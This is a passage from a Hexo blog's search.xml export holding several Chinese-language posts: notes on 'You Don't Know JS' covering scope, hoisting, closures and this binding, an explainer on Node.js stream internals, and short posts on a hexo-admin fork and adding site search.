    <content type="text"><![CDATA[《你不知道的JavaScript》系列丛书给出了很多颠覆以往对JavaScript认知的点, 读完上卷，受益匪浅，于是对其精华的知识点进行了梳理。 什么是作用域作用域是一套规则，用于确定在何处以及如何查找变量。 编译原理JavaScript是一门编译语言。在传统编译语言的流程中，程序中一段源代码在执行之前会经历三个步骤，统称为“编译”。 分词/词法分析将字符串分解成有意义的代码块，代码块又称词法单元。比如程序var a = 2;会被分解为var、a、=、2、; 解析/语法分析将词法单元流转换成一个由元素逐级嵌套所组成的代表了程序语法接口的书，又称“抽象语法树”。 代码生成将抽象语法树转换为机器能够识别的指令。 理解作用域作用域 分别与编译器、引擎进行配合完成代码的解析 引擎执行时会与作用域进行交流，确定RHS与LHS查找具体变量，如果查找不到会抛出异常。 编译器负责语法分析以及生成代码。 作用域负责收集并维护所有变量组成的一系列查询，并确定当前执行的代码对这些变量的访问权限。 对于 var a = 2 这条语句，首先编译器会将其分为两部分，一部分是 var a，一部分是 a = 2。编译器会在编译期间执行 var a，然后到作用域中去查找 a 变量，如果 a 变量在作用域中还没有声明，那么就在作用域中声明 a 变量，如果 a 变量已经存在，那就忽略 var a 语句。然后编译器会为 a = 2 这条语句生成执行代码，以供引擎执行该赋值操作。所以我们平时所提到的变量提升，无非就是利用这个先声明后赋值的原理而已！ 异常对于 var a = 10 这条赋值语句，实际上是为了查找变量 a， 并且将 10 这个数值赋予它，这就是 LHS 查询。 对于 console.log(a) 这条语句，实际上是为了查找 a 的值并将其打印出来，这是 RHS 查询。 为什么区分 LHS 和 RHS 是一件重要的事情？在非严格模式下，LHS 调用查找不到变量时会创建一个全局变量，RHS 查找不到变量时会抛出 ReferenceError。 在严格模式下，LHS 和 RHS 查找不到变量时都会抛出 ReferenceError。 作用域的工作模式作用域共有两种主要的工作模型。第一种是最为普遍的，被大多数编程语言所采用的词法作用域( JavaScript 中的作用域就是词法作用域)。另外一种是动态作用域，仍有一些编程语言在使用(比如Bash脚本、Perl中的一些模式等)。 词法作用域词法作用域是一套关于引擎如何寻找变量以及会在何处找到变量的规则。词法作用域最重要的特征是它的定义过程发生在代码的书写阶段(假设没有使用 eval() 或 with )。来看示例代码:123456789101112function foo() &#123; console.log(a); // 2&#125;function bar() &#123; var a = 3; foo();&#125;var a = 2;bar() 词法作用域让foo()中的a通过RHS引用到了全局作用域中的a，因此会输出2。 动态作用域而动态作用域只关心它们从何处调用。换句话说，作用域链是基于调用栈的，而不是代码中的作用域嵌套。因此，如果 JavaScript 具有动态作用域，理论上，下面代码中的 foo() 在执行时将会输出3。123456789101112function foo() &#123; console.log(a); // 3&#125;function bar() &#123; var a = 3; foo();&#125;var a = 2;bar() 函数作用域匿名与具名对于函数表达式一个最熟悉的场景可能就是回调函数了，比如123setTimeout( function() &#123; console.log("I waited 1 second!")&#125;, 1000 ) 这叫作匿名函数表达式。函数表达式可以匿名，而函数声明则不可以省略函数名。匿名函数表达式书写起来简单快捷,很多库和工具也倾向鼓励使用这种风格的代码。但它也有几个缺点需要考虑。 匿名函数在栈追踪中不会显示出有意义的函数名,使得调试很困难。 如果没有函数名,当函数需要引用自身时只能使用已经过期的 arguments.callee 引用,比如在递归中。另一个函数需要引用自身的例子,是在事件触发后事件监听器需要解绑自身。 匿名函数省略了对于代码可读性 / 可理解性很重要的函数名。一个描述性的名称可以让代码不言自明。 始终给函数表达式命名是一个最佳实践:123setTimeout( function timeoutHandler() &#123; // 我有名字了 console.log("I waited 1 second!")&#125;, 1000 ) 提升先有声明还是先有赋值考虑以下代码：12345a = 2;var a;console.log(a); // 2 考虑另外一段代码123console.log(a); // undefinedvar a = 2; 我们习惯将 var a = 2; 看作一个声明，而实际上 JavaScript 引擎并不这么认为。它将 var a 和 a = 2 当作两个单独的声明，第一个是编译阶段的任务，而第二个是执行阶段的任务。这意味着无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端，这个过程称为提升。 可以看出，先有声明后有赋值。 再来看以下代码：123456foo(); // TypeErrorbar(); // ReferenceErrorvar foo = function bar() &#123; // ...&#125;; 这个代码片段经过提升后，实际上会被理解为以下形式:123456789var foo;foo(); // TypeErrorbar(); // ReferenceErrorfoo = function() &#123; var bar = ...self... // ...&#125;; 这段程序中的变量标识符 foo() 被提升并分配给全局作用域，因此 foo() 不会导致 ReferenceError。但是 foo 此时并没有赋值(如果它是一个函数声明而不是函数表达式就会赋值)。foo()由于对 undefined 值进行函数调用而导致非法操作，因此抛出 TypeError 异常。另外即时是具名的函数表达式，名称标识符(这里是 bar )在赋值之前也无法在所在作用域中使用。 闭包之前写过关于闭包的一篇文章深入浅出JavaScript之闭包(Closure) 循环和闭包要说明闭包，for 循环是最常见的例子。12345for (var i = 1; i &lt;= 5; i++) &#123; setTimeout( function timer() &#123; console.log(i); &#125;, i*1000 )&#125; 正常情况下，我们对这段代码行为的预期是分别输出数字 1~5，每秒一次，每次一个。但实际上，这段代码在运行时会以每秒一次的频率输出五次6。 它的缺陷在于：根据作用域的工作原理，尽管循环中的五个函数是在各个迭代中分别定义的，但是它们都被封闭在一个共享的全局作用域中，因此实际上只有一个i。因此我们需要更多的闭包作用域。我们知道IIFE会通过声明并立即执行一个函数来创建作用域，我们来进行改进：12345678for (var i = 1; i &lt;= 5; i++) &#123; (function() &#123; var j = i; setTimeout( function timer() &#123; console.log(j); &#125;, j*1000 ) &#125;)();&#125; 还可以对这段代码进行一些改进：1234567for (var i = 1; i &lt;= 5; i++) &#123; (function(j) &#123; setTimeout( function timer() &#123; console.log(j); &#125;, j*1000 ) &#125;)(i);&#125; 在迭代内使用 IIFE 会为每个迭代都生成一个新的作用域，使得延迟函数的回调可以将新的作用域封闭在每个迭代内部，每个迭代中都会含有一个具有正确值的变量供我们访问。 重返块作用域我们使用 IIFE 在每次迭代时都创建一个新的作用域。换句话说，每次迭代我们都需要一个块作用域。我们知道 let 声明可以用来劫持块作用域，那我们可以进行这样改：123456for (var i = 1; i &lt;= 5; i++) &#123; let j = i; setTimeout( function timer() &#123; console.log(j); &#125;, j*1000 )&#125; 本质上这是将一个块转换成一个可以被关闭的作用域。 此外，for循环头部的 let 声明还会有一个特殊行为。这个行为指出每个迭代都会使用上一个迭代结束时的值来初始化这个变量。12345for (let i = 1; i &lt;= 5; i++) &#123; setTimeout( function timer() &#123; console.log(i); &#125;, i*1000 )&#125; this全面解析之前写过一篇深入浅出JavaScript之this。我们知道this是在运行时进行绑定的，并不是在编写时绑定，它的上下文取决于函数调用时的各种条件。this的绑定和函数声明的位置没有任何关系，只取决于函数的调用方式。 this词法来看下面这段代码的问题：123456789101112var obj = &#123; id: "awesome", cool: function coolFn() &#123; console.log(this.id); &#125;&#125;;var id = "not awesome";obj.cool(); // awesomesetTimeout( obj.cool, 100); // not awesome obj.cool() 与 setTimeout( obj.cool, 100 ) 输出结果不一样的原因在于 cool() 函数丢失了同 this 之间的绑定。解决方法最常用的是 var self = this;123456789101112131415var obj = &#123; count: 0, cool: function coolFn() &#123; var self = this; if (self.count &lt; 1) &#123; setTimeout( function timer()&#123; self.count++; console.log("awesome?"); &#125;, 100) &#125; &#125;&#125;obj.cool(); // awesome? 这里用到的知识点是我们非常熟悉的词法作用域。self 只是一个可以通过词法作用域和闭包进行引用的标识符，不关心 this 绑定的过程中发生了什么。 ES6 中的箭头函数引人了一个叫作 this 词法的行为：12345678910111213var obj = &#123; count: 0, cool: function coolFn() &#123; if (this.count &lt; 1) &#123; setTimeout( () =&gt; &#123; this.count++; console.log("awesome?"); &#125;, 100) &#125; &#125;&#125;obj.cool(); // awesome? 箭头函数弃用了所有普通 this 绑定规则，取而代之的是用当前的词法作用域覆盖了 this 本来的值。因此，这个代码片段中的箭头函数只是”继承”了 cool() 函数的 this 绑定。 但是箭头函数的缺点就是因为其是匿名的，上文已介绍过具名函数比匿名函数更可取的原因。而且箭头函数将程序员们经常犯的一个错误给标准化了：混淆了 this 绑定规则和词法作用域规则。 箭头函数不仅仅意味着可以少写代码。本书的作者认为使用 bind() 是更靠得住的方式。12345678910111213var obj = &#123; count: 0, cool: function coolFn() &#123; if (this.count &lt; 1) &#123; setTimeout( () =&gt; &#123; this.count++; console.log("more awesome"); &#125;.bind( this ), 100) &#125; &#125;&#125;obj.cool(); // more awesome 绑定规则函数在执行的过程中，可以根据下面这4条绑定规则来判断 this 绑定到哪。 默认绑定 独立函数调用 隐式绑定 当函数引用有上下文对象时，隐式绑定规则会把函数调用中的 this 绑定到这个上下文对象 显示绑定 call/apply bind（本质是对call/apply函数的封装 fn.apply( obj, arguments )） 第三方库的许多函数都提供了一个可选的参数(上下文)，其作用和 bind() 一样，确保回调函数使用指定的 this new 绑定 JavaScript 中的 new 机制实际上和面向类的语言完全不同 实际上并不存在所谓的“构造函数”，只有对于函数的“构造调用” 书中对4条绑定规则的优先级进行了验证，得出以下的顺序优先级: 函数是否在 new 中调用（new 绑定）？如果是的话 this 绑定的是新创建的对象。 函数是否通过 call、apply（显式绑定）或者硬绑定（bind）调用？如果是的话，this 绑定的是指定对象。 函数是否在某个上下文对象中调用（隐式绑定）？如果是的话，this 绑定的是那个上下文对象。 如果都不是的话，使用默认绑定。在严格模式下，绑定到 undefined，否则绑定到全局对象。 被忽略的 this如果你把 null 或者 undefined 作为 this 的绑定对象传入 call、apply 或者 bind，这些值在调用时会被忽略，实际应用的是默认规则。 什么时候会传入 null/undefined 呢？一种非常常见的做法是用 apply(..) 来“展开”一个数组，并当作参数传入一个函数。类似地，bind(..) 可以对参数进行柯里化(预先设置一些参数),如下代码：12345678910function foo(a, b) &#123; console.log( "a:" + a + ", b:" + b );&#125;// 把数组"展开"成参数foo.apply(null, [2, 3]); // a:2, b:3// 使用 bind(..) 进行柯里化var bar = foo.bind( null, 2);bar(3); // a:2, b:3 其中 ES6 中，可以用 … 操作符代替 apply(..) 来“展开”数组，但是 ES6 中没有柯里化的相关语法，因此还是需要使用 bind(..)。 使用 null 来忽略 this 绑定可能产生一些副作用。如果某个函数(比如第三库中的某个函数)确实使用了 this ，默认绑定规则会把 this 绑定到全局对象，这将导致不可预计的后果。更安全的做法是传入一个特殊的对象，一个 “DMZ” 对象，一个空的非委托对象，即 Object.create(null)。123456789101112function foo(a, b) &#123; console.log( "a:" + a + ", b:" + b );&#125;var ø = Object.create(null);// 把数组"展开"成参数foo.apply( ø, [2, 3]); // a:2, b:3// 使用 bind(..) 进行柯里化var bar = foo.bind( ø, 2);bar(3); // a:2, b:3 对象JavaScript中的对象有字面形式（比如var a = { .. })和构造形式（比如var a = new Array(..)）。字面形式更常用，不过有时候构造形式可以提供更多选择。 作者认为“JavaScript中万物都是对象”的观点是不对的。因为对象只是 6 个基础类型( string、number、boolean、null、undefined、object )之一。对象有包括 function 在内的子对象，不同子类型具有不同的行为，比如内部标签 [object Array] 表示这是对象的子类型数组。 复制对象首先看下这个对象：1234let a = &#123; name: 'XiaoMing', habits: ['a', 'b']&#125; 从这个对象，先抛出下面几个概念： 普通的 = 赋值：b = a，如果修改了 b.name，那么 a.name 也会改变 浅复制：如果修改了 b.name, a.name 不会改变，但是修改 b.habits 数组中的值，a.habits 的值也会改变 深复制：b 的值改变，不会对 a 产生任何影响 对于 JSON 安全的对象(就是能用 JSON.stringify 序列号的字符串)来说，有一种巧妙的深复制方法： 1var newObj = JSON.parse( JSON.stringify(someObj) ) 但是这个方法存在以下坑： 如果对象里面有循环引用，会抛错 不能复制对象里面的 Date、Function、RegExp 所有的构造函数会指向 Object 看下面这个对象：12345678910111213141516function anotherFunction() &#123; /*..*/ &#125;var anotherObject = &#123; c: true&#125;;var anotherArray = [];var myObject = &#123; a: 2, b: anotherObject, // 引用，不是复本！ c: anotherArray, // 另一个引用！ d: anotherFunction&#125;;anotherArray.push( myObject ) 如何准确地表示 myObject 的复制呢？ 这个例子中除了复制 myObject 以外还会复制 anotherArray。这时问题就来了，anotherArray 引用了 myObject, 所以又需要复制 myObject，这样就会由于循环引用导致死循环。该如何解决呢？ 可以查看在 diana 库中的实践。 相比于深复制，浅复制非常易懂并且问题要少得多，ES6 定义了 Object.assign(..) 方法来实现浅复制。 Object.assign(..) 方法的第一个参数是目标对象，之后还可以跟一个或多个源对象。它会遍历一个或多个源对象的所有可枚举的自由键并把它们复制到目标对象，最后返回目标对象，就像这样：123456var newObj = Object.assign( &#123;&#125;, myObject );newObj.a; // 2newObj.b === anotherObject; // truenewObj.c === anotherArray; // truenewObj.d === anotherFunction; // true 类JavaScript 有一些近似类的语法元素（比如 new 和 instanceof）, 后来的 ES6 中新增了一些如 class 的关键字。但是 JavaScript 实际上并没有类。类是一种设计模式，JavaScript 的机制其实和类完全不同。 类的继承(委托)其实就是复制，但和其他语言中类的表现不同(其他语言类表现出来的都是复制行为)，JavaScript 中的多态（在继承链中不同层次名称相同，但是功能不同的函数）并不表示子类和父类有关联，子类得到的只是父类的一份复本。 JavaScript 通过显示混入和隐式混入 call() 来模拟其他语言类的表现。此外，显示混入实际上无法完全模拟类的复制行为，因为对象(和函数！别忘了函数也是对象)只能复制引用，无法复制被引用的对象或者函数本身。 检查“类”关系思考下面的代码：1234567function Foo() &#123; // ...&#125;Foo.prototype.blah = ...;var a = new Foo(); 我们如何找出 a 的 “祖先”（委托关系）呢？ 方法一：a instanceof Foo; // true (对象 instanceof 函数) 方法二: Foo.prototype.isPrototypeOf(a); // true (对象 isPrototypeOf 对象) 方法三: Object.getPrototypeOf(a) === Foo.prototype; // true (Object.getPrototypeOf() 可以获取一个对象的 [[Prototype]]) 链; 方法四: a.__proto__ == Foo.prototype; // true 构造函数 函数不是构造函数，而是当且仅当使用 new 时，函数调用会变成“构造函数调用”。 使用 new 会在 prototype 生成一个 constructor 属性，指向构造调用的函数。 constructor 并不表示被构造，而且 constructor 属性并不是一个不可变属性，它是不可枚举的，但它是可以被修改的。 对象关联来看下面的代码： 123456789var foo = &#123; something: function() &#123; console.log("Tell me something good..."); &#125;&#125;;var bar = Object.create(foo);bar.something(); // Tell me something good... Object.create(..)会创建一个新对象 (bar) 并把它关联到我们指定的对象 (foo)，这样我们就可以充分发挥 [[Prototype]] 机制的为例（委托）并且避免不必要的麻烦 (比如使用 new 的构造函数调用会生成 .prototype 和 .constructor 引用)。 Object.create(null) 会创建一个拥有空链接的对象，这个对象无法进行委托。由于这个对象没有原型链，所以 instanceof 操作符无法进行判断，因此总是会返回 false 。这些特殊的空对象通常被称作“字典”，它们完全不会受到原型链的干扰，因此非常适合用来存储数据。 我们并不需要类来创建两个对象之间的关系，只需要通过委托来关联对象就足够了。而Object.create(..)不包含任何“类的诡计”，所以它可以完美地创建我们想要的关联关系。 此书的第二章第6部分就把面对类和继承和行为委托两种设计模式进行了对比，我们可以看到行为委托是一种更加简洁的设计模式，在这种设计模式中能感受到Object.create()的强大。 ES6中的Class来看一段 ES6中Class 的例子123456789101112131415161718192021222324252627282930class Widget &#123; constructor(width, height) &#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125; render($where)&#123; if (this.$elem) &#123; this.$elem.css(&#123; width: this.width + "px"， height: this.height + "px" &#125;).appendTo($where); &#125; &#125;&#125;class Button extends Widget &#123; constructor(width, height, label) &#123; super(width, height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label) &#125; render($where) &#123; super($where); this.$elem.click(this.onClick.bind(this)); &#125; onClick(evt) &#123; console.log("Button '" + this.label + "' clicked!") &#125;&#125; 除了语法更好看之外，ES6还有以下优点 基本上不再引用杂乱的 .prototype 了。 Button 声明时直接 “继承” 了 Widget。 可以通过 super(..)来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。 class 字面语法不能声明属性（只能声明方法）。这是一种限制，但是它会排除掉许多不好的情况。 可以通过 extends 很自然地扩展对象(子)类型。 但是 class 就是完美的吗？在传统面向类的语言中，类定义之后就不会进行修改，所以类的设计模式就不支持修改。但JavaScript 最强大的特性之一就是它的动态性，在使用 class 的有些时候还是会用到 .prototype 以及碰到 super (期望动态绑定然而静态绑定) 的问题，class 基本上都没有提供解决方案。 这也是本书作者希望我们思考的问题。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解 Node Stream 内部机制]]></title>
    <url>%2Fblog%2F2017%2F06%2F06%2F2017-06-06-dive-to-nodejs-at-stream-module%2F</url>
    <content type="text"><![CDATA[相信很多人对 Node 的 Stream 已经不陌生了，不论是请求流、响应流、文件流还是 socket 流，这些流的底层都是使用 stream 模块封装的，甚至我们平时用的最多的 console.log 打印日志也使用了它，不信你打开 Node runtime 的源码，看看 lib/console.js： 12345678910111213function write(ignoreErrors, stream, string, errorhandler) &#123; // ... stream.once('error', noop); stream.write(string, errorhandler); //...&#125;Console.prototype.log = function log(...args) &#123; write(this._ignoreErrors, this._stdout, `$&#123;util.format.apply(null, args)&#125;\n`, this._stdoutErrorHandler);&#125;; Stream 模块做了很多事情，了解了 Stream，那么 Node 中其他很多模块理解起来就顺畅多了。 本文代码和图片可以在这里取用：https://github.com/barretlee/dive-into-node-stream。 stream 模块如果你了解 生产者和消费者问题 的解法，那理解 stream 就基本没有压力了，它不仅仅是资料的起点和落点，还包含了一系列状态控制，可以说一个 stream 就是一个状态管理单元。了解内部机制的最佳方式除了看 Node 官方文档，还可以去看看 Node 的 源码： lib/module.js lib/_stream_readable.js lib/_stream_writable.js lib/_stream_tranform.js lib/_stream_duplex.js 把 Readable 和 Writable 看明白，Tranform 和 Duplex 就不难理解了。 Readable StreamReadable Stream 存在两种模式，一种是叫做 Flowing Mode，流动模式，在 Stream 上绑定 ondata 方法就会自动触发这个模式，比如： 1234const readable = getReadableStreamSomehow();readable.on('data', (chunk) =&gt; &#123; console.log(`Received $&#123;chunk.length&#125; bytes of data.`);&#125;); 这个模式的流程图如下： 资源的数据流并不是直接流向消费者，而是先 push 到缓存池，缓存池有一个水位标记 highWatermark，超过这个标记阈值，push 的时候会返回 false，什么场景下会出现这种情况呢？ 消费者主动执行了 .pause() 消费速度比数据 push 到缓存池的生产速度慢 有个专有名词来形成这种情况，叫做「背压」，Writable Stream 也存在类似的情况。 流动模式，这个名词还是很形象的，缓存池就像一个水桶，消费者通过管口接水，同时，资源池就像一个水泵，不断地往水桶中泵水，而 highWaterMark 是水桶的浮标，达到阈值就停止蓄水。下面是一个简单的 Demo： 12345678910111213141516171819202122232425262728293031const Readable = require('stream').Readable;// Stream 实现class MyReadable extends Readable &#123; constructor(dataSource, options) &#123; super(options); this.dataSource = dataSource; &#125; // 继承了 Readable 的类必须实现这个函数 // 触发系统底层对流的读取 _read() &#123; const data = this.dataSource.makeData(); this.push(data); &#125;&#125;// 模拟资源池const dataSource = &#123; data: new Array(10).fill('-'), // 每次读取时 pop 一个数据 makeData() &#123; if (!dataSource.data.length) return null; return dataSource.data.pop(); &#125;&#125;;const myReadable = new MyReadable(dataSource);myReadable.setEncoding('utf8');myReadable.on('data', (chunk) =&gt; &#123; console.log(chunk);&#125;); 另外一种模式是 Non-Flowing Mode，没流动，也就是暂停模式，这是 Stream 的预设模式，Stream 实例的 _readableState.flow 有三个状态，分别是： _readableState.flow = null，暂时没有消费者过来 _readableState.flow = false，主动触发了 .pause() _readableState.flow = true，流动模式 当我们监听了 onreadable 事件后，会进入这种模式，比如： 123const myReadable = new MyReadable(dataSource);myReadable.setEncoding('utf8');myReadable.on('readable', () =&gt; &#123;&#125;); 监听 readable 的回调函数第一个参数不会传递内容，需要我们通过 myReadable.read() 主动读取，为啥呢，可以看看下面这张图： 资源池会不断地往缓存池输送数据，直到 highWaterMark 阈值，消费者监听了 readable 事件并不会消费数据，需要主动调用 .read([size]) 函数才会从缓存池取出，并且可以带上 size 参数，用多少就取多少： 12345678const myReadable = new MyReadable(dataSource);myReadable.setEncoding('utf8');myReadable.on('readable', () =&gt; &#123; let chunk; while (null !== (chunk = myReadable.read())) &#123; console.log(`Received $&#123;chunk.length&#125; bytes of data.`); &#125;&#125;); 这里需要注意一点，只要数据达到缓存池都会触发一次 readable 事件，有可能出现「消费者正在消费数据的时候，又触发了一次 readable 事件，那么下次回调中 read 到的数据可能为空」的情况。我们可以通过 _readableState.buffer 来查看缓存池到底缓存了多少资源： 1234567let once = false;myReadable.on('readable', (chunk) =&gt; &#123; console.log(myReadable._readableState.buffer.length); if (once) return; once = true; console.log(myReadable.read());&#125;); 上面的代码我们只消费一次缓存池的数据，那么在消费后，缓存池又收到了一次资源池的 push 操作，此时还会触发一次 readable 事件，我们可以看看这次存了多大的 buffer。 需要注意的是，buffer 大小也是有上限的，默认设置为 16kb，也就是 16384 个字节长度，它最大可设置为 8Mb，没记错的话，这个值好像是 Node 的 new space memory 的大小。 上面介绍了 Readable Stream 大概的机制，还有很多细节部分没有提到，比如 Flowing Mode 在不同 Node 版本中的 Stream 实现不太一样，实际上，它有三个版本，上面提到的是第 2 和 第 3 个版本的实现；再比如 Mixins Mode 模式，一般我们只推荐（允许）使用 ondata 和 onreadable 的一种来处理 Readable Stream，但是如果要求在 Non-Flowing Mode 的情况下使用 ondata 如何实现呢？那么就可以考虑 Mixins Mode 了。 Writable Stream原理与 Readable Stream 是比较相似的，数据流过来的时候，会直接写入到资源池，当写入速度比较缓慢或者写入暂停时，数据流会进入队列池缓存起来，如下图所示： 当生产者写入速度过快，把队列池装满了之后，就会出现「背压」，这个时候是需要告诉生产者暂停生产的，当队列释放之后，Writable Stream 会给生产者发送一个 drain 消息，让它恢复生产。下面是一个写入一百万条数据的 Demo： 12345678910111213141516function writeOneMillionTimes(writer, data, encoding, callback) &#123; let i = 10000; write(); function write() &#123; let ok = true; while(i-- &gt; 0 &amp;&amp; ok) &#123; // 写入结束时回调 ok = writer.write(data, encoding, i === 0 ? callback : null); &#125; if (i &gt; 0) &#123; // 这里提前停下了，'drain' 事件触发后才可以继续写入 console.log('drain', i); writer.once('drain', write); &#125; &#125;&#125; 我们构造一个 Writable Stream，在写入到资源池的时候，我们稍作处理，让它效率低一点： 12345678910111213const Writable = require('stream').Writable;const writer = new Writable(&#123; write(chunk, encoding, callback) &#123; // 比 process.nextTick() 稍慢 setTimeout(() =&gt; &#123; callback &amp;&amp; callback(); &#125;); &#125;&#125;);writeOneMillionTimes(writer, 'simple', 'utf8', () =&gt; &#123; console.log('end');&#125;); 最后执行的结果是： 1234drain 7268drain 4536drain 1804end 说明程序遇到了三次「背压」，如果我们没有在上面绑定 writer.once(&#39;drain&#39;)，那么最后的结果就是 Stream 将第一次获取的数据消耗完变结束了程序。 pipe了解了 Readable 和 Writable，pipe 这个常用的函数应该就很好理解了， 1readable.pipe(writable); 这句代码的语意性很强，readable 通过 pipe（管道）传输给 writable，pipe 的实现大致如下（伪代码）： 123456789101112131415Readable.prototype.pipe = function(writable, options) &#123; this.on('data', (chunk) =&gt; &#123; let ok = writable.write(chunk); // 背压，暂停 !ok &amp;&amp; this.pause(); &#125;); writable.on('drain', () =&gt; &#123; // 恢复 this.resume(); &#125;); // 告诉 writable 有流要导入 writable.emit('pipe', this); // 支持链式调用 return writable;&#125;; 上面做了五件事情： emit(pipe)，通知写入 .write()，新数据过来，写入 .pause()，消费者消费速度慢，暂停写入 .resume()，消费者完成消费，继续写入 return writable，支持链式调用 当然，上面只是最简单的逻辑，还有很多异常和临界判断没有加入，具体可以去看看 Node 的代码（ /lib/_stream_readable.js）。 Duplex StreamDuplex，双工的意思，它的输入和输出可以没有任何关系， Duplex Stream 实现特别简单，不到一百行代码，它继承了 Readable Stream，并拥有 Writable Stream 的方法（源码地址）： 123456789101112const util = require('util');const Readable = require('_stream_readable');const Writable = require('_stream_writable');util.inherits(Duplex, Readable);var keys = Object.keys(Writable.prototype);for (var v = 0; v &lt; keys.length; v++) &#123; var method = keys[v]; if (!Duplex.prototype[method]) Duplex.prototype[method] = Writable.prototype[method];&#125; 我们可以通过 options 参数来配置它为只可读、只可写或者半工模式，一个简单的 Demo： 1234567891011121314151617var Duplex = require('stream').Duplexconst duplex = Duplex();// readablelet i = 2;duplex._read = function () &#123; this.push(i-- ? 'read ' + i : null);&#125;;duplex.on('data', data =&gt; console.log(data.toString()));// writableduplex._write = function (chunk, encoding, callback) &#123; console.log(chunk.toString()); callback();&#125;;duplex.write('write'); 输出的结果为： 123writeread 1read 0 可以看出，两个管道是相互之间不干扰的。 Transform StreamTransform Stream 集成了 Duplex Stream，它同样具备 Readable 和 Writable 的能力，只不过它的输入和输出是存在相互关联的，中间做了一次转换处理。常见的处理有 Gzip 压缩、解压等。 Transform 的处理就是通过 _transform 函数将 Duplex 的 Readable 连接到 Writable，由于 Readable 的生产效率与 Writable 的消费效率是一样的，所以这里 Transform 内部不存在「背压」问题，背压问题的源头是外部的生产者和消费者速度差造成的。 关于 Transfrom Stream，我写了一个简单的 Demo： 1234567891011121314151617181920212223const Transform = require('stream').Transform;const MAP = &#123; 'Barret': '靖', 'Lee': '李'&#125;; class Translate extends Transform &#123; constructor(dataSource, options) &#123; super(options); &#125; _transform(buf, enc, next) &#123; const key = buf.toString(); const data = MAP[key]; this.push(data); next(); &#125;&#125;var transform = new Translate();transform.on('data', data =&gt; console.log(data.toString()));transform.write('Lee');transform.write('Barret');transform.end(); 小结本文主要参考和查阅 Node 官网的文档和源码，细节问题都是从源码中找到的答案，如有理解不准确之处，还请斧正。关于 Stream，这篇文章只是讲述了基础的原理，还有很多细节之处没有讲到，要真正理解它，还是需要多读读文档，写写代码。 了解了这些 Stream 的内部机制，对我们后续深入理解上层代码有很大的促进作用，特别希望初学 Node 的同学花点时间进来看看。 另外，本文代码和图片可以在这里取用：https://github.com/barretlee/dive-into-node-stream。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂谈</category>
      </categories>
      <tags>
        <tag>前端杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过 admin 后台管理 hexo 博客]]></title>
    <url>%2Fblog%2F2017%2F06%2F04%2F2017-06-04-admin-platform-manage-hexo-blog%2F</url>
    <content type="text"><![CDATA[用了两年的 hexo 写博客，但随着博客数量的增加，构建变得原来越耗时，写博客也是强依赖于文本编辑器，无法通过 web 实时修改，更加没办法通过手机端去修改博客的内容，这让我挺苦恼。 在纠结要不要更换成 WP/Ghost 良久之后，我决定，还是先把 Hexo 整个体验优化一下，等以后有大把空闲时间了，再折腾迁移的事情。 博客后台管理为了能够方便管理博客，我自己写过一个简单的 Blog Writer，然后配合 MakeFile 来简化流程，事实上，还是太麻烦了。在网上搜罗了一番，找到了两个博客管理后台，一个叫做 hexo-hey，界面还是做的挺不错的，但是呢，功能比较简单，或者说过于简单；还有一个就是我当前使用的 hexo-admin，其实也没多多少功能，只不过在细节上的处理稍微完善一些，而且项目活跃度也高一点，但仍然不能满足我的需求——它不支持移动端。 所以我 fork 了这个项目，对它做了一些修改，目前是可以通过移动端编辑的。在 PC 上访问这个后台，长这个样子： Fork 过来后，给官方提过一个 PR，貌似还没有合并，合并的那些代码主要是兼容了移动端，但是后来我又发现了它的各种 bug 和性能问题，修复后，并没有提 PR，最新的代码在这里：hexo-admin。 使用如果你要使用我修改的代码可以这么做： 按照官方的方式安装 hexo-admin 下载我修改的代码到一个文件夹，执行 npm link; 在 hexo 根目录下执行 npm link hexo-admin; 把代码链接过去，我懒得给官方提 PR 了，这玩意儿我做了一些私人定制，不适合继续提 PR 了，比如 Pages 我只允许展示 /pages 目录下的资源。 整个后台使用 react 构建的，代码逻辑还比较清晰，喜欢折腾的同学可以在原来的代码基础上继续修改。 P.S. 当前这篇文章就是通过 Web 编辑的，我的 hexo 博客已经部署到阿里云了。]]></content>
      <categories>
        <category>前端杂谈</category>
      </categories>
      <tags>
        <tag>前端杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为 Hexo 博客增加一个站内搜索]]></title>
    <url>%2Fblog%2F2017%2F06%2F04%2F2017-06-04-hexo-search-insite%2F</url>
    <content type="text"><![CDATA[这个页面的右上角就可以看到效果（如果你是通过 PC 打开的话~）。 最近两个周末在 Hexo 博客的构建上做了不少事情，我会分成几篇文章一一叙述，首先来说一说 Hexo 的一个插件 hexo-generator-search，利用它可以给博客增加一个站内搜索，如下图所示： 上面这个样式是我自己写的，但是用到了插件生成的 xml 文件，下面我来简述下如何安装和使用它。 安装安装分为两步，首先通过 npm 将插件安装到本地： 1npm install hexo-generator-search --save 然后在全局（_config.yml）配置： 123search: path: search.xml field: post path，生成的路径，上述配置后可以通过 /search.xml 访问到文件 field，用来配置全局检索的区间，可以是 post/page/all 使用并不是安装好这个插件就完事儿了，这个插件做的事情只是把配置文件中提到的检索区域内容打包进 search.xml，剩下的工作还是需要自己来做的，我写了一个栗子，也就是本博客正在使用的效果，想偷懒的同学可以拿过去使用： hexo-search-plugin-snippets 代码比较粗糙，也是直接从网上拿过来做了些细节改动，初始化代码引入好了之后，初始化方法： 12345if ($('.local-search').size() &amp;&amp; !isMobile.any()) &#123; $.getScript('path/to/search.js', function() &#123; searchFunc("/search.xml", 'local-search-input', 'local-search-result'); &#125;);&#125; 细节问题自己去研究研究吧~]]></content>
      <categories>
        <category>前端杂谈</category>
      </categories>
      <tags>
        <tag>前端杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我眼中的前端九段]]></title>
    <url>%2Fblog%2F2017%2F06%2F03%2F2017-06-03-fe-nine%2F</url>
